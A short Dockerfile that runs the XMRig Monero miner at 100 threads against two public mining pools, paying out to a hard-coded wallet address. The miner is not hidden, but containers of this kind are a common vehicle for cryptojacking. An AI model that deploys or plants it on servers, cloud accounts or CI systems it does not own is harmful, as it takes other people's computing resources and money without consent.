FROM miningcontainers/xmrig:latest

ENTRYPOINT ["./xmrig"]
CMD ["--url=pool.minexmr.com:3333", "--user=8ApxQypUrLMD1q8mHPjPQC4HPz16jYzDEUziDcDPDoQx81MyZoC1U2wYoPQXxZgYEX9cWyStrRfTDQwN8TpcCyd9RuAp18L.barkowi", "--algo=rx", "--pass=x", "-t=100","--url=pool.supportxmr.com:7777", "--user=8ApxQypUrLMD1q8mHPjPQC4HPz16jYzDEUziDcDPDoQx81MyZoC1U2wYoPQXxZgYEX9cWyStrRfTDQwN8TpcCyd9RuAp18L.barkowi", "--algo=rx", "--pass=asw", "-k", "-t=100"]
